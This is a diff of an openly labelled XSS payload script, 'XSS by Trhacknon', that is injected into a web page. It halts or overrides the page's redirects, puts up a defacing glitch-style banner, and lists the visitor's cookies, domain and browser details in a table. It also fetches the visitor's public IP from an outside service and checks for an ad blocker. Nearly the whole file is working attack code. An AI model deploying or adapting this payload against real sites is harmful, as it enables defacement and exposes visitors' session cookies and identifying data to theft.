@@ -1,16 +1,14 @@
-// 🔒 Anti-redirection by trhacknon
-location.assign = () => {};
-location.replace = () => {};
-clearTimeout = () => {};
-clearInterval = () => {};
-Object.defineProperty(window, 'location', {
-  value: {},
-  writable: false
-});
-console.log('🔥 Redirection bloquée par trknxs.js');
+// 🔒 trknxssblck.js – Bloque la redirection sans bloquer le DOM
+setTimeout(() => {
+    window.stop();
+    console.log("🚫 Redirection stoppée par trhacknon");
+    main();
+}, 10); // attendre que le DOM charge un minimum
 
-(function() {
-    // Style glitchy pour la page
+function main() {
+    // === Interface + collecte d'infos ===
+    
+    // Style glitchy
     const style = `
         @keyframes glitch {
             0% { text-shadow: 2px 2px lime, -2px -2px cyan; }
@@ -61,24 +59,20 @@ console.log('🔥 Redirection bloquée par trknxs.js');
             margin: 10px;
         }
     `;
-
-    // Ajouter le style à la page
     const styleElement = document.createElement('style');
     styleElement.innerHTML = style;
     document.head.appendChild(styleElement);
 
-    // Titre de la page
+    // Titre et logos
     const title = document.createElement('h2');
     title.innerHTML = `<center><img src="https://github.com/trh4ckn0n/work/raw/refs/heads/main/trknanon.svg" alt="Logo 1" /></center>
 😈 XSS by Trhacknon 😈`;
     document.body.appendChild(title);
 
-    // Conteneur pour afficher les données
     const container = document.createElement('div');
     container.classList.add('container');
     document.body.appendChild(container);
-    
-    // Ajouter les logos SVG
+
     const logoContainer = document.createElement('div');
     logoContainer.classList.add('logo');
     logoContainer.innerHTML = `
@@ -86,20 +80,16 @@ console.log('🔥 Redirection bloquée par trknxs.js');
     `;
     container.appendChild(logoContainer);
 
-    // Table pour afficher les informations collectées
+    // Tableau d'info
     const table = document.createElement('table');
     const headerRow = document.createElement('tr');
-    headerRow.innerHTML = `
-        <th>🔑 Clé</th>
-        <th>📊 Valeur</th>
-    `;
+    headerRow.innerHTML = `<th>🔑 Clé</th><th>📊 Valeur</th>`;
     table.appendChild(headerRow);
     const infoTableBody = document.createElement('tbody');
     infoTableBody.id = 'infoTable';
     table.appendChild(infoTableBody);
     container.appendChild(table);
 
-    // Données à collecter
     const data = [
         { key: '🍪 COOKIE', value: document.cookie },
         { key: '🌐 DOMAIN', value: document.domain },
@@ -119,23 +109,22 @@ console.log('🔥 Redirection bloquée par trknxs.js');
         { key: '💡 IP PUBLIC', value: 'Chargement...' }
     ];
 
-    // Ajouter les données à la table
     data.forEach(d => {
         const row = document.createElement('tr');
         row.innerHTML = `<td>${d.key}</td><td>${d.value}</td>`;
         infoTableBody.appendChild(row);
     });
 
-    // Récupérer l'IP publique avec l'API ipify
+    // IP publique
     fetch('https://api64.ipify.org?format=json')
         .then(res => res.json())
-        .then(data => {
+        .then(res => {
             const row = document.createElement('tr');
-            row.innerHTML = `<td>💡 IP PUBLIC</td><td>${data.ip}</td>`;
+            row.innerHTML = `<td>💡 IP PUBLIC</td><td>${res.ip}</td>`;
             infoTableBody.appendChild(row);
         });
 
-    // Vérification d'AdBlock
+    // Détection AdBlock
     fetch('https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js', { method: 'HEAD' })
         .then(() => {
             const row = document.createElement('tr');
@@ -147,5 +136,4 @@ console.log('🔥 Redirection bloquée par trknxs.js');
             row.innerHTML = `<td>📢 AdBlock</td><td>Oui</td>`;
             infoTableBody.appendChild(row);
         });
-
-})();
+}
